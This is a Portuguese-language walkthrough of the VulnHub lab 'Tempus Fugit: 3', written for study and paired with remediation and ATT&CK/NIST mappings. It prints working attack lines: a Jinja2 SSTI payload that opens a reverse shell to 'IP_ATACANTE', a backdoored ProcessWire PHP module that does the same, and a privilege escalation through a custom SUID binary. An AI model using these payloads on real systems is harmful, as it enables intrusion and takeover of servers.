# Tempus Fugit: 3 — O Tempo Voa, Mas o Root Exige Paciência

Tempus fugit, em latim, significa "o tempo voa." Essa máquina faz jus ao nome: cada passo exige precisão, paciência e disposição para olhar mais fundo que a superfície. Esta é uma máquina de nível Difícil com uma das cadeias de ataque mais intrincadas do VulnHub. Jinja2 SSTI te dá execução de código, um banco de dados SQLCipher criptografado esconde credenciais e flags, tunelamento SSH expõe um segundo aplicativo web interno, um módulo ProcessWire malicioso entrega um segundo shell, TOTP 2FA baseado em QR code protege um usuário, um binário SUID personalizado com uma verificação de UID hardcoded é o chefe final, e um usuário com UID 0xdeadbeef desbloqueia o root. Sem mentira, essa máquina é uma obra-prima de complexidade. Muito respeito ao criador. GG.

| Campo | Valor |
|---|---|
| **Nível** | Difícil |
| **VM Alvo** | Tempus Fugit: 3 |
| **VM Atacante** | Kali Linux |
| **URL VulnHub** | https://www.vulnhub.com/entry/tempus-fugit-3,551/ |
| **Técnicas** | Server-Side Template Injection (SSTI) Jinja2, descriptografia de banco de dados SQLCipher, scan de portas Python, encaminhamento local de porta SSH, upload de módulo malicioso ProcessWire CMS, extração de segredo TOTP via QR code, movimentação lateral SSH, engenharia reversa de binário SUID (bypass de UID hardcoded), criação de usuário com UID específico |
| **CVEs** | CWE-94 (Injeção de Código: SSTI Jinja2 via render_template_string), CWE-321 (Chave Criptográfica Hardcoded: pragma key no código fonte), CWE-732 (Atribuição Incorreta de Permissão: binário SUID com UID hardcoded), CWE-312 (Armazenamento em Texto Claro: segredo QR 2FA em imagem de backup) |
| **Grupos APT** | APT41: explora injeção de template server-side em aplicações web como técnica de acesso inicial; atores de ameaças têm como alvo específico instâncias ProcessWire CMS com uploads de módulos maliciosos para persistência |

---

## Resumo do Ataque

```
netdiscover → tempusf3.vh
    |
    v
nmap → porta web (app Flask), SSH
    |
    v
painel de login → teste SSTI: {{7*'7'}} → 7777777 (Jinja2 confirmado)
    |
    v
{{...os.popen('id').read()}} → RCE como usuário webapp
    |
    v
shell reversa via SSTI → shell bash
    |
    v
cat app.py → secret_key + pragma_key + Flag 1 (base64)
    |
    v
sqlcipher database.db → PRAGMA key='...' → usuários + Flag 2 (base64 → porta 37303)
    |
    v
scanner de portas Python → portas 37303 (SSH) + 443 (HTTPS) internas
    |
    v
túnel SSH → -L 37303:127.0.0.1:37303 -L 8443:127.0.0.1:443
    |
    v
ProcessWire CMS na 443 → admin:Hugh → upload módulo malicioso → shell
    |
    v
PNG de backup → QR code → segredo TOTP → Google Authenticator
    |
    v
ssh myrtia@tempusf3.vh -p 37303 → código TOTP → Flag 4
    |
    v
sudo addcustomer → criar usuário UID 1337 → su → ler chave privada SSH
    |
    v
ssh -i id_rsa cecil@tempusf3.vh -p 37303
    |
    v
binário SUID ping personalizado → Ghidra: getuid() == 0xdeadbeef
    |
    v
sudo addcustomer → criar usuário UID 3735928559 → su → ./ping deadbeef → root
    |
    v
cat /root/flag.txt → GG
```

---

## Metodologia

1. Descoberta de host e scan completo de portas
2. Detecção de SSTI e confirmação Jinja2
3. RCE via shell reversa Jinja2 SSTI
4. Análise de código fonte para chaves embutidas
5. Descriptografia de banco de dados SQLCipher para credenciais e flags
6. Scan de portas internas e configuração de túnel SSH
7. Comprometimento ProcessWire CMS via módulo malicioso
8. Extração de segredo TOTP via QR code para usuário myrtia
9. Movimentação lateral para usuário cecil via chave SSH encontrada
10. Engenharia reversa de binário SUID e bypass de UID para root

---

## Passo 1 — Descoberta de Host e Configuração

```bash
sudo netdiscover -i eth0
echo "192.168.x.x  tempusf3.vh" >> /etc/hosts
```

Scan completo de portas:

```bash
nmap -A -p- tempusf3.vh
```

Descubra a porta da aplicação web e a porta SSH. O aplicativo web roda um aplicativo Flask.

**MITRE ATT&CK:** T1046 — Descoberta de Serviços de Rede

---

## Passo 2 — Detecção de SSTI e Confirmação Jinja2

A aplicação web apresenta um painel de login. Um campo de formulário aceita entrada do usuário que é refletida na resposta. Teste para Server-Side Template Injection:

**Detecção Twig vs Jinja2:**

```
Entrada: {{7*'7'}}
Saída Twig: 49
Saída Jinja2: 7777777
```

Digite `{{7*'7'}}` no campo vulnerável. Se a resposta mostrar `7777777`, você confirmou SSTI Jinja2.

Confirme execução de comando OS:

```
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

Resposta esperada: `uid=1000(webapp) gid=1000(webapp)`

**Nota do mundo real:** SSTI Jinja2 (CWE-94) é causado por passar entrada controlada pelo usuário para `render_template_string()` em vez de `render_template()`. É uma vulnerabilidade crítica porque engines de template têm acesso direto ao runtime Python. APT41 explorou vulnerabilidades SSTI em aplicações web Python em intrusões documentadas contra empresas de tecnologia. Caramba!

**MITRE ATT&CK:** T1059.006 — Intérprete de Comando e Script: Python; T1190 — Exploração de Aplicação Pública

---

## Passo 3 — Shell Reversa via SSTI

Inicie um listener:

```bash
nc -lvnp 4444
```

Entregue uma shell reversa através do SSTI:

```
{{''.__class__.__mro__[1].__subclasses__()[373](['bash','-c','bash -i >& /dev/tcp/IP_ATACANTE/4444 0>&1'],stdout=-1,stderr=-1).communicate()}}
```

Se o índice 373 não funcionar, encontre o índice correto da classe Popen e use-o.

Estabilização do shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm; export SHELL=bash
# Ctrl+Z → stty raw -echo; fg
```

**MITRE ATT&CK:** T1059.006 — Intérprete de Comando e Script: Python

---

## Passo 4 — Leia app.py para Chave Secreta, Pragma Key e Flag 1

```bash
cat app.py
```

Procure por:
- `secret_key = '<valor>'`
- `PRAGMA key = '<valor>'`
- String base64 embutida em comentários ou variáveis

Decodifique a Flag 1:

```bash
echo "<string_base64_do_app.py>" | base64 -d
# Flag 1 revelada
```

**MITRE ATT&CK:** T1552.001 — Credenciais em Arquivos

---

## Passo 5 — Descriptografar Banco de Dados SQLCipher

Encontre o banco de dados SQLCipher:

```bash
find / -name "*.db" 2>/dev/null
```

Descriptografe usando a pragma key do app.py:

```bash
sqlcipher database.db
```

```sql
PRAGMA key='<pragma_key_do_app.py>';
.tables
SELECT * FROM users;
SELECT * FROM flags;
```

A tabela de usuários contém credenciais. Uma string base64 na tabela de flags decodifica para revelar um número de porta:

```bash
echo "<flag2_base64>" | base64 -d
# Flag 2 + porta 37303
```

**Nota do mundo real:** Embutir chaves de criptografia diretamente no código fonte da aplicação (CWE-321) derrota o propósito da criptografia. Qualquer atacante com acesso de leitura ao código recupera o texto claro. As chaves devem ser armazenadas em variáveis de ambiente, HSMs ou gerenciadores de segredos dedicados, nunca no código. Mano, isso é básico!

**MITRE ATT&CK:** T1552.001 — Credenciais em Arquivos

---

## Passo 6 — Scan de Portas Internas

A flag decodificada revela uma porta interna (37303). Escaneie todas as portas internas usando Python:

```python
import socket
for port in range(1, 65535):
    s = socket.socket()
    s.settimeout(0.1)
    if s.connect_ex(('127.0.0.1', port)) == 0:
        print(port)
    s.close()
```

Portas descobertas: **37303** (SSH em porta não padrão) e **443** (HTTPS, app web interna).

**MITRE ATT&CK:** T1046 — Descoberta de Serviços de Rede

---

## Passo 7 — Encaminhamento de Porta SSH e ProcessWire CMS

Encaminhe ambas as portas internas para o atacante:

```bash
ssh -L 37303:127.0.0.1:37303 -L 8443:127.0.0.1:443 <usuario>@tempusf3.vh -p <porta_ssh_externa>
```

Navegue para `https://127.0.0.1:8443/` — painel admin do ProcessWire CMS.

O site menciona **"Hugh Janus"** como administrador. Do banco de dados SQLCipher, a senha do Hugh é conhecida. Login:

- Usuário: `admin`
- Senha: `Hugh` (ou o valor do BD para este usuário)

**Upload de módulo ProcessWire malicioso:**

Faça o download de um módulo legítimo ProcessWire (exemplo HelloWorld). Edite o arquivo PHP para injetar uma shell reversa:

```php
else {
    system('bash -c "bash -i >& /dev/tcp/IP_ATACANTE/5555 0>&1"');
}
```

Inicie um listener:

```bash
nc -lvnp 5555
```

Faça o upload através do menu Módulos, Instalar, Upload. Carregue/acione o módulo para disparar a shell reversa.

**MITRE ATT&CK:** T1505 — Componente de Software do Servidor; T1190 — Exploração de Aplicação Pública

---

## Passo 8 — Movimentação Lateral para myrtia via QR Code TOTP

Do novo shell, procure imagens de backup:

```bash
find / -name "*.png" -o -name "*.jpg" 2>/dev/null | grep -i backup
```

Um arquivo PNG contém um **QR code** codificando um segredo TOTP (Senha de Uso Único Baseada em Tempo) para o usuário `myrtia`.

Opções para decodificar o QR:
1. Exfiltre a imagem e escaneie com Google Lens ou um leitor QR
2. Use `zbarimg` no alvo (se disponível): `zbarimg backup.png`

A string decodificada é um URI `otpauth://`. Importe no Google Authenticator ou qualquer app TOTP.

```bash
ssh myrtia@tempusf3.vh -p 37303
# Quando solicitado o código 2FA, insira o código TOTP atual
```

```bash
cat ~/flag4.txt
# Flag 4 capturada

sudo -l
# (root) NOPASSWD: /caminho/para/addcustomer
```

**Nota do mundo real:** Armazenar QR codes TOTP como imagens de backup (CWE-312) é um erro comum. O QR code é a semente, equivalente a uma senha em texto claro. Qualquer atacante que o acessa pode clonar o segundo fator completamente. Véi, isso é sério!

**MITRE ATT&CK:** T1621 — Geração de Solicitação de MFA; T1552 — Credenciais Não Seguras

---

## Passo 9 — Movimentação Lateral para cecil via Chave SSH

Use o privilégio sudo `addcustomer` para criar um usuário com UID 1337:

```bash
sudo /caminho/para/addcustomer
# Siga os prompts: crie usuário com UID 1337
```

Mude para o novo usuário:

```bash
su usuario_uid1337
find / -uid 1337 -type f 2>/dev/null
# Encontra um arquivo acessível apenas ao UID 1337 — contém chave privada SSH
cat /caminho/para/arquivo_uid1337
```

Salve a chave privada e tente-a contra cada usuário:

```bash
ssh -i id_rsa_encontrada cecil@tempusf3.vh -p 37303
```

**MITRE ATT&CK:** T1021.004 — Serviços Remotos: SSH

---

## Passo 10 — Engenharia Reversa de Binário SUID e Root

Encontre o binário SUID personalizado:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Analise o binário `ping` personalizado:

```bash
strings /caminho/para/ping
```

Análise no Ghidra (da máquina atacante) revela:

```c
if (getuid() == 0xdeadbeef) {
    system("/bin/sh");
}
```

`0xdeadbeef` em decimal é `3735928559`. Crie um usuário com exatamente esse UID:

```bash
sudo /caminho/para/addcustomer
# Crie usuário com UID 3735928559
su usuario_deadbeef
/caminho/para/ping deadbeef
```

```
# id
uid=3735928559(usuario_deadbeef) gid=...
whoami
root
```

```bash
cat /root/flag.txt
```

(☞ﾟヮﾟ)☞ Root. Tempus fugit mesmo! A paciência valeu a pena!

**MITRE ATT&CK:** T1548.001 — Abuso do Mecanismo de Controle de Elevação: SUID; T1068 — Exploração para Escalação de Privilégios

---

## Flags, Hashes e Credenciais Capturados

| Tipo | Valor | Encontrado em | Técnica |
|---|---|---|---|
| Flag 1 | codificada em base64 | app.py comentário embutido | Análise de código fonte |
| Flag 2 | codificada em base64 | Tabela de flags BD SQLCipher | Descriptografia BD |
| Flag 3 | (varia) | ProcessWire ou sistema de arquivos | RCE módulo |
| Flag 4 | flag4.txt | /home/myrtia/ | Login SSH TOTP |
| Chave privada SSH | (material da chave) | Arquivo restrito UID 1337 | Bypass criação de usuário |
| Flag root | (varia) | /root/flag.txt | Bypass UID SUID |

---

## Lições Aprendidas

| # | Achado | Relevância no Mundo Real | Lição Principal |
|---|---|---|---|
| 1 | SSTI Jinja2 via render_template_string | SSTI é severidade crítica; APT41 explora em apps web Python | Nunca passe entrada de usuário para render_template_string(); sempre use render_template() |
| 2 | Chave de criptografia (pragma key) hardcoded em app.py | CWE-321 derrota a criptografia; atacante com acesso ao código recupera todos os dados | Armazene todas as chaves criptográficas em variáveis de ambiente ou gerenciadores de segredos |
| 3 | Imagem de backup QR code TOTP acessível ao usuário shell | O QR é a semente; qualquer um com acesso pode clonar o 2FA | Delete ou criptografe QR codes de backup TOTP; use tokens de hardware para contas críticas |
| 4 | Upload de módulo ProcessWire habilita RCE | Painéis de admin CMS com upload de arquivo são alvos frequentes de comprometimento | Desative upload de módulos em produção; restrinja painel admin a IPs confiáveis |
| 5 | Binário SUID com verificação de UID hardcoded | Lógica de segurança personalizada em binários frequentemente é falha; decompilação é trivial | Evite binários SUID personalizados; use sudo padrão com permissões mínimas |

---

## Mapeamento MITRE ATT&CK

| Fase | Tática | Técnica | ID TTP |
|---|---|---|---|
| Reconhecimento | Descoberta | Descoberta de Serviços de Rede | T1046 |
| Acesso Inicial | Acesso Inicial | Exploração de Aplicação Pública (SSTI) | T1190 |
| Execução | Execução | Intérprete de Comando e Script: Python | T1059.006 |
| Acesso a Credenciais | Acesso a Credenciais | Credenciais em Arquivos | T1552.001 |
| Descoberta | Descoberta | Descoberta de Conexões de Rede do Sistema | T1049 |
| Movimentação Lateral | Movimentação Lateral | Tunelamento de Protocolo | T1572 |
| Persistência | Persistência | Componente de Software do Servidor: Módulo | T1505 |
| Movimentação Lateral | Movimentação Lateral | Serviços Remotos: SSH | T1021.004 |
| Acesso a Credenciais | Acesso a Credenciais | Bypass de MFA | T1621 |
| Escalação de Privilégios | Escalação de Privilégios | Abuso de Controle de Elevação: SUID | T1548.001 |
| Escalação de Privilégios | Escalação de Privilégios | Exploração para Escalação de Privilégios | T1068 |

---

## Remediação e Contenção

### Correções Técnicas

1. **Corrija SSTI:** use `render_template()` em vez de `render_template_string()` para entrada controlada pelo usuário
2. **Mova pragma key para ambiente:** `os.environ.get('DB_PRAGMA_KEY')` e nunca comite chaves para o código fonte
3. **Delete imagens QR code TOTP de backup:** armazene segredos TOTP apenas no aplicativo autenticador
4. **Restrinja upload de módulo ProcessWire:** desative em produção; restrinja painel admin a IPs confiáveis via firewall
5. **Remova binário SUID personalizado:** use sudo com permissões específicas e mínimas em vez disso
6. **Audite todas as configurações SSH:** portas não padrão (37303) devem ser documentadas e monitoradas

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gerenciamento de Ativos | Inventarie todos os serviços internos incluindo portas não padrão |
| Proteger | Controle de Acesso | Remova imagens QR TOTP; restrinja acesso ao painel CMS |
| Proteger | Segurança de Dados | Sem chaves de criptografia no código fonte; use gerenciadores de segredos |
| Detectar | Anomalias e Eventos | Alerte sobre sondas SSTI; uploads incomuns de módulos CMS |
| Responder | Planejamento de Resposta | Corrija SSTI; rotacione todas as credenciais do BD; remova módulos maliciosos |

### NIST SP 800-53 Rev. 5

| Controle | Descrição | Aplicação |
|---|---|---|
| AC-3 | Aplicação de Acesso | Restrinja execução de binário SUID; controles de acesso admin CMS |
| AC-6 | Menor Privilégio | Remova binário SUID personalizado; restrinja sudo addcustomer |
| IA-2(1) | MFA | Proteja adequadamente segredos TOTP; não armazene como arquivos recuperáveis |
| SC-28 | Proteção de Informações em Repouso | Criptografe BD com chaves armazenadas fora do código fonte |
| SI-2 | Remediação de Falhas | Corrija vulnerabilidade SSTI (alta severidade) |
| CM-7 | Menor Funcionalidade | Desative upload de módulo ProcessWire em produção |

### CISA KEV

Vulnerabilidades de Server-Side Template Injection (como exploradas via Jinja2) estão incluídas na orientação da CISA sobre vulnerabilidades de aplicações web. As organizações devem remediar achados SSTI imediatamente, pois eles fornecem execução direta de código em servidores web.

### C2M2

| Domínio | Prática | MIL Alvo |
|---|---|---|
| Gerenciamento de Identidade e Acesso (IAM) | Gerenciar Privilégios e Contas | MIL3 |
| Gerenciamento de Ameaças e Vulnerabilidades (THREAT) | Realizar Avaliações de Vulnerabilidade | MIL3 |

### MITRE D3FEND

- **D3-ACH** — Fortalecimento de Configuração de Aplicação (corrija SSTI; remova binário SUID)
- **D3-HBPI** — Fortalecer Integridade do Pipeline de Build (sem chaves no código fonte)
- **D3-OAM** — Gerenciamento Administrativo do SO (audite todos os binários SUID; restrinja sudo addcustomer)
- **D3-NTF** — Filtragem de Tráfego de Rede (bloqueio firewall painel CMS; restrinja acesso à porta SSH)

---

## Considerações Finais

Tempus Fugit: 3 é uma das máquinas tecnicamente mais exigentes do VulnHub. Ela recompensa enumeração profunda, pensamento criativo e a paciência para trabalhar através de múltiplas camadas. A entrada SSTI é elegante, a descriptografia SQLCipher é um ótimo análogo do mundo real, o bypass TOTP é inteligente, e o hardcode de UID SUID é um finale genuinamente criativo. Se você completar essa máquina sem dicas, você mereceu. O tempo voa, mas a habilidade se acumula. Parabéns a quem chegar até o root! GG rapaziada!

Thanks guys!! (❍ᴥ❍ʋ)
